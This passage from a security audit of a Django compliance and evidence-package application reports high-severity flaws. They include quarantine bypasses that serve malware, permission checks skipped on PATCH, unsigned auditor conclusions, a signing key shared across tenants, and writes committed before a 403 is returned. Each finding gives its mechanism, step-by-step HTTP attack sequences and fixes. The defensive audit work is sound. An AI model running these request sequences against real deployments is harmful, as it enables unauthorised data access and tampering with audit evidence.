**Attack.** An authenticated user who owns a document or has edit on its folder (`DocumentAccessPermission`, documents/permissions.py:31-39) sends `PATCH /api/documents/{id}/` as multipart with a single field `file=<malware.pdf>` (DRF's default parser set is unmodified — settings.py:369-405 sets no `DEFAULT_PARSER_CLASSES`, so MultiPartParser is active). 200 OK. The stored bytes are now unscanned malware; `GET /api/documents/{id}/` still returns `"scan_status": "clean", "quarantined": false, "version": 1`, and `GET /api/documents/{id}/download/` serves it to every user with view access on the folder. `GET /api/documents/{id}/versions/` shows no new entry, so nothing in the UI or the audit trail says the evidence bytes changed.

**Guard checked.** I looked for (a) a serializer-level scan — scanning.py:1-14 documents that scanning is deliberately kept out of validators, so there is none; (b) `read_only_fields` covering `file` — it does not (serializers.py:118-119); (c) an `http_method_names` restriction on the viewset — none (views.py:165-170); (d) a test — documents/tests.py:171 and :182 PATCH only `description` and `folder`, and the whole scanning suite (documents/tests.py:395-520) exercises `POST /api/documents/` and `new_version` only, never PATCH with a file. The sweep is the only backstop and its 30-day staleness window does not catch it.

**Fix.** Call the same two lines `new_version` uses, in `perform_update` before `serializer.save()`: when `"file" in serializer.validated_data`, run `scan_or_raise(serializer.validated_data["file"], self.request)`, archive the outgoing file into a `DocumentVersion`, bump `version`, reset `scan_status`/`scanned_at`/`quarantined_at`, and call `monitor.mark_clean`. The narrower alternative is to make `file` read-only on update (add it to `read_only_fields` for partial/full update) so `new_version` is the only way bytes can change.

---

## [HIGH] Uploading a new version silently releases a quarantined document, and the quarantined bytes stay downloadable through the versions route — archived versions are never scanned at all

**FIXED in this pass.**

**Dimension:** files-in  
**Where:** backend/documents/views.py:248-262 and 290-299; backend/documents/monitor.py:160-181; SECURITY.md:217-219

**Mechanism.** `new_version` archives the current file and then clears the quarantine flag unconditionally:

```python
if doc.file:
    DocumentVersion.objects.create(document=doc, version=doc.version, file=doc.file, ...)
doc.file = new_file
...
doc.quarantined_at = None
doc.scan_status = Document.Scan.UNSCANNED
```

`file=doc.file` is an already-committed `FieldFile`, so the `DocumentVersion` row points at the *same* storage object the scanner flagged. Quarantine is a column on `Document` only (models.py:269); `DocumentVersion` (models.py:321-336) has no scan or quarantine field. `download_version` gates on the parent document — `doc = monitor.refuse_if_quarantined(self.get_object())` (views.py:293) — which now returns clean, and then streams `version.file` (views.py:299). Nothing ever re-scans the archived bytes: `monitor.rescan` iterates `Document.objects.all()` (monitor.py:162) and `scan_document` opens only `document.file` (monitor.py:101), so a `DocumentVersion` can never acquire a verdict. `monitor.quarantined()` (monitor.py:180-181) counts documents only, so the tray/digest counter (notifications/tasks.py:324-328) drops back to zero. SECURITY.md:217-219 states the flagged file "is refused on every route that serves it (download, preview, **versions**, pinned package evidence, PBC attachments)" — the versions clause is false the moment a newer version exists.

**Attack.** A document is uploaded clean and quarantined a month later when new definitions match (the exact scenario monitor.py:12-16 exists for): a `document.quarantined` webhook fires, the manager's tray shows it, downloads 403. Anyone with edit on that folder then posts `POST /api/documents/{id}/new_version/` with a one-byte text file. 200 OK, `quarantined: false`, the alert count goes to zero, the incident looks closed. The flagged bytes are still on disk and are now served by `GET /api/documents/{id}/versions/{vid}/download/` — a SAFE method, so any user with mere *view* access on the folder can fetch the known-malicious file, and the sweep will never look at it again.

**Guard checked.** `refuse_if_quarantined` is called on all three document routes (views.py:275, 287, 293) and on package evidence and PBC items (attestations/views.py:639, 662; pbc_views.py:326, 338), so the author clearly intended full coverage. The test documents/tests_monitor.py:115-129 (`test_uploads_are_marked_clean_and_a_new_version_resets_the_verdict`) asserts the clearing behaviour as intended but never asks whether the archived file is still reachable, and documents/tests_monitor.py:72-103 checks download/preview/list but not the versions route after a release. No code path scans `DocumentVersion.file`.

**Fix.** Two changes. (1) In `new_version`, do not blanket-clear: if `doc.quarantined_at` is set, carry the verdict onto the `DocumentVersion` row (add `quarantined_at`/`scan_status`/`scan_signature` to `DocumentVersion`) rather than dropping it, and have `download_version` refuse on the version's own flag as well as the parent's. (2) Include `DocumentVersion` files in `monitor.rescan`, so archived evidence is swept like live evidence.

---

## [HIGH] The audit-package ZIP export streams quarantined documents' bytes to the external auditor — the one byte route with no quarantine check

**FIXED in this pass.**

**Dimension:** files-in  
**Where:** backend/attestations/bundle.py:432-448; backend/attestations/views.py:337-364; contrast backend/attestations/views.py:639, 662

**Mechanism.** `write_bundle` writes each pinned document's bytes into the ZIP with no verdict check:

```python
if row.document and row.document.file:
    info = zipfile.ZipInfo(row.member_path, date_time=stamp)
    ...
    source = row.document.file.open("rb")
    ...
    with zf.open(info, "w") as target:
        for chunk in iter(lambda: source.read(64 * 1024), b""):
```

`EvidencePackageViewSet.export` (views.py:337-364) checks only that the package is not DRAFT, then calls `bundle.write_bundle(package, handle)` and returns the file. `grep -rn refuse_if_quarantined` finds it at attestations/views.py:639 and :662 (package-evidence `preview` / `file`) and pbc_views.py:326, :338 — never in `export` or in `bundle.py`. SECURITY.md:217-219 enumerates the routes quarantine covers and does not list the export at all, while claiming the file is "refused on every route that serves it".

**Attack.** A document pinned into a sealed package is later flagged by the re-scan sweep and quarantined. The external auditor holding a live `PackageGrant` (attestations/access.py:30-58) requests `GET /api/evidence-packages/{id}/export/`. The per-file routes correctly answer 403, but the bundle downloads normally and contains the quarantined malware as `evidence/NNN-<name><ext>`, extracted onto the auditor's laptop outside the organisation's control. The response header even says `X-Conformiti-Integrity: ok` (views.py:359-363), because the bytes still match the digest recorded at seal time — integrity is satisfied and containment is not.

**Guard checked.** I checked whether pinning filters infected documents (`assert_pinnable`, access.py:86-98, enforces folder visibility only), whether `seal` refuses quarantined evidence (views.py:201-263 checks drift, not scan verdict), and whether the export re-uses the guarded per-file view (it does not — it reads `row.document.file` directly). documents/tests_monitor.py:192-207 asserts the 403 on `package-evidence/file`, `preview` and `pbc-items/file`, and its comment — "The export still runs; the manifest is a record, not a delivery of the bytes" — conflates the manifest endpoint with the bundle; bundle.py:432-448 shows the bundle is a delivery of the bytes.

**Fix.** In `write_bundle`, skip a quarantined document's bytes and record it as missing/withheld rather than writing it: `if row.document and row.document.file and row.document.quarantined_at is None:` with an explicit "withheld: quarantined" note in evidence.csv and the summary, so the auditor is told the artefact exists but was refused rather than silently receiving it. Add the export to the route list in SECURITY.md:217-219 once it is enforced.

---

## [HIGH] PATCH /api/package-evidence/{id}/ re-points a pinned row at any document in the workspace, bypassing folder permissions and serving its bytes

**FIXED in this pass.**

**Dimension:** files-out  
**Where:** backend/attestations/views.py:618-623 (perform_update); backend/attestations/serializers.py:138-151 (document is writable); backend/attestations/views.py:596 (patch allowed); backend/attestations/views.py:651-671 (file); backend/attestations/access.py:86-98 (assert_pinnable, only called on create)

**Mechanism.** `PackageEvidenceViewSet.perform_update` is the whole write check for a PATCH:

    def perform_update(self, serializer):
        row = self.get_object()
        if not access.can_assemble(self.request.user):
            raise PermissionDenied("You cannot change this package.")
        assert_open(row.package_control.package)
        serializer.save()

It never calls `access.assert_pinnable`, which is the module that enforces "you cannot disclose what you cannot see" and which `perform_create` does call (views.py:614). `document` is in `PackageEvidenceSerializer.Meta.fields` (serializers.py:139) and absent from `read_only_fields` (serializers.py:146-151), and `http_method_names` includes `patch` (views.py:596). The field's queryset is `Document.objects` (tenant-pinned, not folder-filtered), so any document in the caller's workspace is accepted. `/package-evidence/{id}/file/` then serves `row.document.file` (views.py:671) after only a `readable_packages` queryset filter — which for a frameworks-capable user without `can_view_all` is `EvidencePackage.objects.filter(created_by=user)` (access.py:49-51), i.e. the attacker's own package. The snapshot columns (`document_name`, `content_sha256`) are read-only and stay stale, so the response is served under the *old* document's name.

**Attack.** A user whose role sets `can_manage_frameworks` but not `can_view_all` / `can_manage_folders` (the exact persona `attestations/tests.py:316` calls "Narrow frameworks"): (1) POST /api/evidence-packages/ -> own draft package; (2) POST /api/evidence-packages/{id}/add_controls/; (3) POST /api/package-evidence/ {package_control, document: <a document they can see>} -> 201; (4) PATCH /api/package-evidence/{ev}/ {"document": <id of any document in a folder they cannot see>} -> 200; (5) GET /api/package-evidence/{ev}/file/ -> 200 with the hidden document's bytes. Ran end to end: step (3)+hidden document is correctly 403 ("You can only add evidence from folders you can already see"), while step (4) returns 200 and step (5) returns `b'SECRET-HR-INVESTIGATION-BYTES'` with `Content-Disposition: attachment; filename="Visible policy"`. A direct GET /api/documents/<hidden>/download/ by the same user is 404. `/preview/` (views.py:632-649) is the same bypass. The audit row written at views.py:667 names the stale `row.document_name`, so the trail records the wrong file.

**Guard checked.** Looked for the guard on the update path: `access.assert_pinnable` (access.py:86-98) exists and is called only from `perform_create` (views.py:614) and, in twin form, from `PbcItemViewSet.perform_create` (pbc_views.py:285-286). `PackageEvidenceSerializer` has no `validate()`. `assert_open` only checks package status, not the document. `DocumentAccessPermission` is never consulted on this route by design (this is the documented bypass module). `attestations/tests.py:305-314` covers exactly this rule for POST and stops there; nothing in the suite PATCHes `document`. SECURITY.md:240-241 asserts the opposite of the observed behaviour: "Packaging cannot launder access: a document can only be pinned by someone who could already see its folder."

**Fix.** Add `"document"` and `"package_control"` to `PackageEvidenceSerializer.Meta.read_only_fields` (attestations/serializers.py:146-151), so a pin is created-or-deleted, never re-aimed. If the field must stay writable, call `access.assert_pinnable(self.request.user, serializer.validated_data["document"])` in `perform_update` and re-run `pin_document` so the snapshot columns match the new file.

---

## [HIGH] A sealed, signed package can gain evidence rows after sealing, and /verify/ still reports ok:true

**Dimension:** files-out  
**Where:** backend/attestations/views.py:618-623 (assert_open checks the row's CURRENT package, not the target); backend/attestations/serializers.py:139 (package_control writable); backend/attestations/views.py:311-325 (verify); backend/attestations/snapshot.py:93-116 (verify_pins)

**Mechanism.** `perform_update` validates `assert_open(row.package_control.package)` — the package the row is in *before* the save — then calls `serializer.save()` with a caller-supplied `package_control`, which may belong to a sealed package. Nothing re-checks the destination. `verify_pins` (snapshot.py:99-116) iterates `PackageEvidence.objects.filter(package_control__package=package)` and only re-hashes each row against its own `content_sha256`; it never compares the live row set against `package.manifest_json`. So an injected row hashes correctly and `verify` (views.py:314-325) returns `ok: True`, `signature: valid`, `discrepancies: []`, even though `items` (2) now disagrees with the signed manifest's `totals.evidence` (1) and nothing surfaces that disagreement.

**Attack.** As a Compliance Manager (a shipped role): seal package B with one artefact; note manifest sha256 and `totals.evidence == 1`. Create draft package A, add a control, pin any document into it -> evidence row `ev`. `PATCH /api/package-evidence/{ev}/ {"package_control": <a PackageControl row of sealed B>}` -> 200. Ran it: sealed B now holds 2 evidence rows; `GET /api/evidence-packages/B/verify/` returns `{'ok': True, 'items': 2, 'discrepancies': [], 'signature': 'valid'}`; `GET /api/package-evidence/?package_control=<B row>` lists `['Smuggled doc', 'Sealed policy']`. The issued auditor sees the smuggled artefact on the sealed package's screen and can download its bytes under their live grant via /file/. The row has no `member_path` (assigned only at seal, bundle.py:141-155), so `write_bundle` skips it and it lands in evidence.csv as MISSING — an offline bundle check flags a discrepancy the live API says does not exist, which reads to an auditor as a broken tool rather than as tampering. The same PATCH can also move a row *out* of a sealed package into a draft (deletion by relocation), and `perform_destroy` (views.py:625-629) correctly blocks the direct route.

**Guard checked.** `assert_open` (views.py:58-63) is the intended immutability guard and is present — it just reads the pre-save parent. `perform_destroy` gets this right for the same viewset. `PackageSampleViewSet` deliberately allows post-seal writes (views.py:509-547) but tracks `sealed_in`; evidence rows have no equivalent. `PackageControlSerializer` marks `package` read-only (serializers.py:184) — `PackageEvidenceSerializer` does not mark `package_control` read-only. No test in `attestations/tests.py` or `tests_samples.py` PATCHes `package_control`.

**Fix.** Mark `package_control` read-only in `PackageEvidenceSerializer.Meta.read_only_fields`. Additionally, have `verify` compare the live row set with the sealed manifest (count and per-row `member_path`/`content_sha256`) and report any row absent from `manifest_json` as a discrepancy, rather than only re-hashing the rows that happen to exist.

---

## [HIGH] An external auditor keeps reading PBC attachment bytes forever after the grant is revoked or expires, by self-assigning a request

**Dimension:** files-out  
**Where:** backend/attestations/access.py:112-121 (readable_pbc_requests ORs Q(assignee=user)); backend/attestations/pbc_views.py:333-343 (file) and :319-331 (preview); backend/attestations/pbc_views.py:69-105 with :84 (assignee accepted on create); backend/attestations/pbc_views.py:266-269 (item queryset)

**Mechanism.** `readable_pbc_requests` returns `PbcRequest.objects.filter(Q(package__in=readable_packages(user)) | Q(assignee=user))`. The right-hand branch has no grant, no expiry and no status condition — unlike `readable_packages` (access.py:52-58) and `live_grant` (access.py:67-83), which both re-check `revoked_at__isnull=True, expires_at__gt=now, status=SEALED`. `PbcItemViewSet.get_queryset` is built from that set (pbc_views.py:266-269), and `file` (pbc_views.py:334-343) does no further authorisation: `_touch_grant` (pbc_views.py:305-309) simply returns without a grant, and the bytes are served. `PbcRequestViewSet.perform_create` accepts a caller-supplied `assignee` (pbc_views.py:84) with no check that it is anyone other than the caller, and a grant-holding auditor is an allowed creator via `_side()` (pbc_views.py:45-51).

**Attack.** Seal package P, issue a 30-day grant to auditor account `aria`. As aria: `POST /api/pbc-requests/ {"package": P, "title": "Payroll listing", "assignee": <aria's own user id>}` -> 201. The organisation answers with `POST /api/pbc-items/ {"request": R, "document": D}`. The organisation then revokes the grant in one click (`DELETE /api/package-grants/{id}/`). Ran it: after revocation `GET /api/evidence-packages/P/` is 404 for aria (package access is gone as designed), but `GET /api/pbc-requests/` still returns the line, and `GET /api/pbc-items/{item}/file/` returns 200 with `b'PBC-ATTACHED-SECRET'`; `/preview/` also returns 200. Expiry behaves identically — `Q(assignee=user)` carries no time bound — so every document the organisation ever attached in answer to a self-assigned line stays readable by the ex-auditor indefinitely. No self-assignment is even required if the organisation ever assigns a line back to the auditor.

**Guard checked.** Checked whether the assignee branch is meant to cover auditors: the docstring at access.py:103-111 justifies it for "a control owner [who] has to be able to answer what they were asked for", i.e. an internal assignee, and says "An assignee is chosen by the organisation" — which perform_create does not enforce. `live_grant` is re-evaluated per request everywhere else (PackageControl conclusions, views.py:419-423; PBC judge, pbc_views.py:233-234) but is not consulted on the item read path. `_touch_grant` tolerates a missing grant by design. No test covers a PBC item read after revocation.

**Fix.** Two changes: (a) in `PbcRequestViewSet.perform_create`/`perform_update`, refuse an `assignee` that is not on the organisation's side — reject `assignee == request.user` when the caller's side is AUDITOR, and reject any assignee holding a grant on that package; (b) make the read path re-check the grant: in `PbcItemViewSet.file`/`preview` (and `get_queryset`), require `access.readable_pbc_requests` membership *plus* either `can_assemble`, or `live_grant(...) is not None`, or an assignee who is not a grantee — so a revoked or expired grant closes the attachment route the way it closes the package route.

---

## [HIGH] Meeting-minute files and form templates are downloadable by every authenticated account, including an external auditor with no grant, with no folder check and no audit row

**Dimension:** files-out  
**Where:** backend/governance/views.py:196-201 (minute download) with :46-51 (ManageDocumentsOrReadOnly) and :180-184; backend/documents/views.py:350-354 (template download) with backend/accounts/permissions.py:9-14 (_CapabilityPermission)

**Mechanism.** `ManageDocumentsOrReadOnly.has_permission` is `return True if request.method in SAFE_METHODS else u.can_manage_documents` (governance/views.py:46-51) — a GET is allowed for any authenticated user. `MeetingMinuteViewSet.queryset` is `MeetingMinute.objects.select_related(...)` (governance/views.py:181) with no per-object filter, and the `download` action calls `serve_stored_file(minute.file, ...)` directly (governance/views.py:196-201): no folder model, no `FolderPermission`, no `record_evidence_read`. `FormTemplateViewSet` is the same shape through `_CapabilityPermission`, which "grant[s] read to any authenticated user" (accounts/permissions.py:9-14), and its download is explicitly not audited (documents/views.py:352-354). Neither route consults `documents.access.accessible_folder_ids`, which is the mechanism that constrains every other byte-serving endpoint (documents/views.py:172-178).

**Attack.** Create a MeetingSeries "Security Steering Committee" with a minute whose file holds board material. Authenticate as the shipped `Auditor` role (`is_auditor=True`, no capabilities, no PackageGrant at all) or as the shipped `Viewer` role (no capabilities). Ran both: `GET /api/meeting-minutes/` returns 200 listing every minute in the workspace; `GET /api/meeting-minutes/{id}/download/` returns 200 with `b'CONFIDENTIAL BOARD MINUTES'`; `GET /api/form-templates/{id}/download/` returns 200 with the template bytes. `AuditLog.objects.filter(action="read").count()` stays 0 afterwards, so the reads leave no trace. The external auditor account exists purely to receive a time-boxed package grant, and this hands it the organisation's committee minutes outside any package, before any grant is issued and after every grant is revoked.

**Guard checked.** Looked for a per-object gate on the minute route: `MeetingMinuteViewSet` declares no `get_queryset` override and no object permission class, unlike `DocumentViewSet` which pairs a folder-filtered queryset with `DocumentAccessPermission` (documents/views.py:166-178). Checked whether the exposure is documented as accepted: it is not — SECURITY.md:236-240 states an auditor "can read exactly the artefacts pinned into [a sealed package], and nothing else", and the shipped Auditor role's own description is "Read-only external auditor; sees only granted folders" (compliance/management/commands/seed_frameworks.py:33). No test in governance/tests.py or documents/tests.py asserts a non-privileged or auditor account is refused either download.

**Fix.** Give `MeetingMinuteViewSet` a real read gate — either scope minutes to a folder (as documents are) or, minimally, require `can_manage_documents`/`can_manage_users` for read and exclude `is_auditor` accounts, replacing `ManageDocumentsOrReadOnly` on that viewset — and route the download through `record_evidence_read` so it appears in the trail. For `FormTemplateViewSet.download`, require the `can_manage_documents` capability rather than inheriting `_CapabilityPermission`'s read-open SAFE_METHODS branch.

---

## [HIGH] The Ed25519 signature covers only manifest.json — the auditor's conclusions in controls.csv/samples.csv are unsigned, and verify.py still prints "signature: VALID … the bundle is theirs and unchanged" after they are rewritten

**Dimension:** crypto  
**Where:** backend/attestations/bundle.py:490-505 (unsigned members, SHA256SUMS written last and never signed); backend/attestations/signing.py:185-198 (sign_package signs only package.manifest_json); backend/attestations/verifier.py:164-187, 220-235, 276-289; backend/attestations/views.py:232-246 vs 411-430

**Mechanism.** `sign_package` signs exactly one thing: `raw = (package.manifest_json or "").encode("utf-8")` (signing.py:188). In the exported ZIP, `write()` (bundle.py:421-425) accumulates a digest for every member into `members`, and the last line writes those digests as `SHA256SUMS` with `zf.writestr(zipfile.ZipInfo("SHA256SUMS", …), checksums)` (bundle.py:502-505) — SHA256SUMS itself is signed by nothing. So the signature transitively binds only manifest.json and, through each evidence item's `"sha256"` (bundle.py:95), the evidence bytes. `controls.csv`, `evidence.csv`, `samples.csv`, `trail.csv`, `INTEGRITY.txt`, `README.txt` and `verify.py` (bundle.py:490-499) are bound by SHA256SUMS alone, which a forger regenerates in one command. verify.py's `check_signature` (verifier.py:164-187) reads only `manifest.json`; its SHA256SUMS loop (verifier.py:220-235) iterates the file's own lines and never walks the directory, so unlisted members are invisible; and on success it prints "OK — every file matches both the bundle checksums and the sealed manifest" plus "if they match, the bundle is theirs and unchanged" (verifier.py:282-285). This is worse than it first looks because of ordering: the manifest is built and signed inside `seal` (views.py:238-246), while `design_conclusion` / `operating_conclusion` / `auditor_note` and every sample `result` are written *after* sealing by the granted auditor (views.py:411-430, 540-576). The auditor's actual findings therefore never enter the signed manifest at all — controls.csv and samples.csv are the only record of them in the bundle, and neither is signed.

**Attack.** I ran the shipped verifier against a bundle I assembled with `attestations/manifest.py` + a real Ed25519 key. (1) Honest bundle: `verifier.main(root)` → exit 0, "signature : VALID (Ed25519)", controls.csv row `CC1.1,Exception,Exception,"Control did not operate for 3 of 25 samples."`. (2) Forgery: rewrite controls.csv to `CC1.1,Effective,Effective,"No exceptions noted."`, recompute SHA256SUMS (touching nothing else) → `verifier.main(root)` → exit 0, "signature : VALID (Ed25519)", "OK — every file matches both the bundle checksums and the sealed manifest", "the bundle is theirs and unchanged". (3) Dropping an unlisted file `evidence/001-CC1_1/002-addendum.pdf` into the tree without touching SHA256SUMS → still exit 0, still VALID. Who: anyone who handles the ZIP between the assessed organisation and the auditor — the organisation itself, a mailbox, a file-share link, an auditor's own workstation. What they get: an audit package that passes every check the product tells the auditor to run while reporting the opposite conclusions from the ones the auditor recorded.

**Guard checked.** `tests_signing.py:108-150` is the closest guard and it stops one step short: it forges *manifest.json*, rewrites SHA256SUMS and MANIFEST.sha256 "as a forger would", and asserts the signature fails. No test forges controls.csv, samples.csv or verify.py. `unsafe()` (verifier.py:146-153) only blocks path escape. SECURITY.md:245-259 states what the signature proves ("the manifest was signed by whoever held the key at sealing") but never says the rest of the bundle is outside it, and README.txt asserts the opposite — "The digests prove the files in this bundle are the files that were sealed" (bundle.py:355-356) — for files that did not exist at seal.

**Fix.** Sign the member list, not just the manifest. Cheapest correct change: sign `SHA256SUMS` as well (a second detached `sums.sig` over the same key), and in verify.py (a) verify that signature, (b) refuse any file present in the bundle directory that has no SHA256SUMS line, and (c) cross-check controls.csv/samples.csv against the manifest where the two overlap. Because conclusions are recorded after seal, also add a post-engagement counter-signature over a `workpaper.json` carrying conclusions, sample results and their `concluded_by`/`tested_by` stamps, so the thing an auditor actually reads is inside a signature.

---

## [HIGH] One installation-wide signing key signs every workspace's packages, and the signed manifest names no organisation — on a shared installation, tenant A can produce a bundle that verifies under exactly the fingerprint tenant B publishes

**Dimension:** crypto  
**Where:** backend/attestations/signing.py:88-116 (load_private_key); backend/attestations/models.py:383-395 (SigningKey is a plain models.Model); backend/attestations/bundle.py:110-137 (package_payload); backend/attestations/manifest.py:84-117 (build_manifest); backend/attestations/views.py:370-386 (SigningKeysView)

**Mechanism.** 0.9.0 made every organisation-owned model a `TenantModel`, but `SigningKey` is declared `class SigningKey(models.Model)` (models.py:383) — installation-global, exactly like the map says. `load_private_key()` (signing.py:88-116) resolves the key from `settings.SIGNING_KEY` / `settings.SIGNING_KEY_FILE` and never consults `tenancy.current_id()`; `grep -n workspace backend/attestations/*.py` over non-test code returns nothing at all. So every workspace seals with the same private key. Compounding it, the signed payload carries no tenant identity: `package_payload` (bundle.py:110-137) emits id, name, engagement, audit_firm, framework, scope, dates and person-names, and `mf.build_manifest` (manifest.py:84-117) copies exactly those keys — there is no workspace, no slug, no `tenancy.organisation_name()`. And `SigningKeysView` (views.py:370-386) publishes the whole key list with `authentication_classes = []`, unscoped. The trust anchor the product hands the auditor is precisely the thing that cannot distinguish tenants: README says "Compare the key fingerprint above with the one the organisation published" (bundle.py:391-401) and SECURITY.md:245-259 repeats it.

**Attack.** Installation hosts workspace Alpha and workspace Beta (the 0.9.0 use case). Any Alpha user with the frameworks capability (`access.can_assemble`, access.py:22-27) creates a package with free-text `name`/`engagement`/`audit_firm` set to Beta's — "Beta Corp FY26 SOC 2", audit firm "Beta's auditors" — fills it with whatever evidence and assertion they like, and POSTs `/api/evidence-packages/{id}/seal/`. `sign_package` signs it with the shared installation key. They export and hand the ZIP to Beta's auditor. The auditor follows the documented procedure: fetch the fingerprint from the installation (`GET /api/signing-keys/`, unauthenticated) or from Beta out of band, compare with signing-key.pub, run verify.py. Everything matches, because it is literally the same key. Nothing in the signed bytes says the package came from Alpha.

**Guard checked.** I looked for a per-workspace key path and for tenant identity in the signed payload: `TenantQuerySet._pin()` cannot help because `SigningKey` has no `workspace` column and `signing.py` issues no ORM query for the key at all; `tenancy.organisation_name()` (accounts/tenancy.py:124-134) exists and does return the workspace name once there is more than one workspace, but it is used only by the public questionnaire page (vendors/questionnaire.py:182), never by the manifest. `accounts/tests_tenancy.py` covers list endpoints, by-id fetches and header switching, and has no test touching SigningKey or the manifest. SECURITY.md's "Workspace isolation (0.9.0)" section (line 8ff) and its signing section (245-259) never meet.

**Fix.** Two changes, both small: (1) put the tenant in the signed bytes — add `"workspace": {"slug": …, "name": …}` to `package_payload`/`build_manifest` and bump `MANIFEST_VERSION`, so a bundle states which organisation produced it inside the signature; (2) make the key per workspace — give `SigningKey` a workspace column and resolve `SIGNING_KEY_FILE` as `<dir>/<workspace-slug>.key`, and scope `SigningKeysView` to the workspace being asked about. If a single shared key is a deliberate deployment choice for single-org installs, (1) is still required and the docs must say the fingerprint identifies the installation, not the organisation.

---

## [HIGH] The sidebar's workspace label shows the superuser's home workspace, not the workspace they are actually reading and writing

**Dimension:** frontend  
**Where:** backend/accounts/serializers.py:48-50; frontend/src/components/layout/Sidebar.jsx:22-25; frontend/src/api/client.js:93-102; backend/accounts/tenancy.py:159-167, 305-318

**Mechanism.** `UserSerializer.get_workspace_detail` (`accounts/serializers.py:48-50`) is `ws = obj.workspace; return {"id": ws.pk, "name": ws.name, "slug": ws.slug}` — a forward-FK read of the user's own `workspace_id` column. It never consults `tenancy.current_id()`. `Sidebar.jsx:22-25` renders exactly that value (`me.workspace_detail.name`, `data-testid="workspace-name"`) as the one persistent workspace indicator in the app chrome; `TopBar.jsx` has none. Meanwhile the request interceptor at `client.js:100-102` reads `localStorage.getItem("workspace")` and stamps `X-Workspace` on **every** API call, and `tenancy.workspace_id_for` (`tenancy.py:159-167`) honours that header for a superuser. So for a switched superuser the entire data plane is workspace B — reads are pinned by `TenantQuerySet._pin()` and, critically, **writes are stamped** by `TenantModel.assign_workspace` (`tenancy.py:312-313`, `wid = current_id()`) — while the chrome says workspace A, permanently and with no other cue.

**Attack.** Superuser Sam is homed in workspace `acme`. Sam opens Settings → Workspaces and clicks Switch on tenant `beta` to investigate a support ticket; `Account.jsx:1017-1018` writes `localStorage.workspace = "beta"` and reloads. The sidebar renders "Acme Corp". `localStorage` survives the reload, tab close and browser restart, and is only cleared by an explicit sign-out (`client.js:170`). Two days later Sam opens the app, sees "Acme Corp" in the sidebar, and works: uploads an evidence PDF, adds controls to an evidence package, seals it. Every one of those rows is stamped `workspace_id = beta` by `assign_workspace`, and the file lands in beta's programme. The mirror case is a data-exposure one: Sam exports `/api/risks/export/` or `/api/access-reviews/{id}/export/` believing it is Acme's register and attaches the CSV to an Acme ticket — it is beta's.

**Guard checked.** I looked for a switched-workspace indicator, a server-side truth source in the shell, and a test. `Account.jsx:1011` does fetch `/api/workspaces/current/`, which *is* correct (it resolves through `current_id()`), but it is rendered only inside the Settings page's Workspaces block, not in the chrome. `Account.jsx:1101` warns "Switching reloads the app in that workspace; sign out to come back to your own" — prose on one page, gone the moment you navigate away. `accounts/tests_tenancy.py:192-207` covers that the header is honoured for superusers and ignored for everyone else, but nothing asserts what the UI *says* afterwards; `e2e/tests/screenshots.spec.js:164-189` only screenshots the workspaces block and never checks `workspace-name`.

**Fix.** Make the shell display the active workspace, not the account's home one. Smallest correct change: add an `active_workspace` field to the `/api/users/me/` response computed from `tenancy.current()` (not `obj.workspace`), and render that in `Sidebar.jsx:22-25`; when it differs from `workspace_detail`, render it in an alarm tone with the slug, e.g. "Viewing: Beta Ltd (switched)". Keep `workspace_detail` for the account's home so the difference is visible.

---

## [HIGH] A write refused with 403 has already been committed: the issued auditor can forge the organisation's management response on a sealed package

**FIXED in this pass.**

**Dimension:** integrity-races  
**Where:** backend/attestations/views.py:418-436 (PackageControlViewSet.perform_update); no ATOMIC_REQUESTS anywhere in backend/config/settings.py

**Mechanism.** The two branches run in sequence with two separate `serializer.save()` calls and no transaction around them. If a PATCH touches both a conclusion field and `management_response`, branch one (`:418-427`) executes first: `live_grant` succeeds for the issued auditor, and `serializer.save(...)` writes the ENTIRE validated payload — including `management_response` — and commits, because `ATOMIC_REQUESTS` is not set in settings.py (grep returns nothing), so DRF runs in autocommit. Only then does branch two (`:428-432`) evaluate `access.can_assemble(user)`, find the auditor lacks it, and raise `PermissionDenied`. DRF turns that into a 403 response — after the row has already been changed on disk. The permission check is a post-condition on a write that already happened.

**Attack.** Proven by execution. Package sealed and issued to auditor `aria` (Auditor role, no frameworks capability). `PATCH /api/package-controls/{id}/ {"design_conclusion":"exceptions","auditor_note":"control failed","management_response":"Management accepts the finding and will remediate."}` returns **403** with `{'detail': 'The management response is written by the assessed organisation.'}` — and `row.refresh_from_db()` shows `management_response == 'Management accepts the finding and will remediate.'` persisted, with `responded_by_name=''` and `responded_at=None` (no attribution, because `stamp(row, user, "responded")` never ran). That text is then emitted in the exported bundle's `controls.csv` under the "Management response" column (bundle.py:190), directly beside README.txt's segregation claim that "The management response column is the organisation's reply and is written by the organisation" (bundle.py:322-324). The external auditor has written the client's admission of the finding, the client sees it in their own UI as their own words, and the API told the auditor they were denied.

**Guard checked.** `access.can_assemble` (access.py:22-27) is the correct authorisation predicate and does return False for the auditor — it is simply evaluated after the write. The reverse direction is safe by luck of ordering: an organisation user sending `management_response` + a conclusion hits branch one first, `live_grant` returns None, and it raises before any save. No `transaction.atomic()` wraps `perform_update` (contrast views.py:176 and views.py:227, which do use it), and `ATOMIC_REQUESTS` is absent from settings.py, so nothing rolls the first save back.

**Fix.** Evaluate every permission for the request before performing any write, then write once: compute `touching_conclusions`/`touching_response`, raise all PermissionDenied checks up front, and issue a single `serializer.save(**extra)`. Wrapping `perform_update` in `transaction.atomic()` would also make the 403 truthful, but the single-save restructure is the real fix and composes with the finding above.

---

## [MEDIUM] Cross-workspace username oracle: DRF's uniqueness check on User.username is workspace-pinned but the DB constraint is installation-wide, so a foreign username returns 500 instead of 400

**Dimension:** tenant-read  
**Where:** backend/accounts/models.py:111 (objects = TenantUserManager()); backend/accounts/serializers.py:63-71 (UserWriteSerializer, no username validator); backend/accounts/tenancy.py:283-287 (TenantUserManager.get_queryset pins); .venv/Lib/site-packages/rest_framework/utils/field_mapping.py:80 (UniqueValidator queryset = model_field.model._default_manager); backend/accounts/views.py:59-141 (UserViewSet)

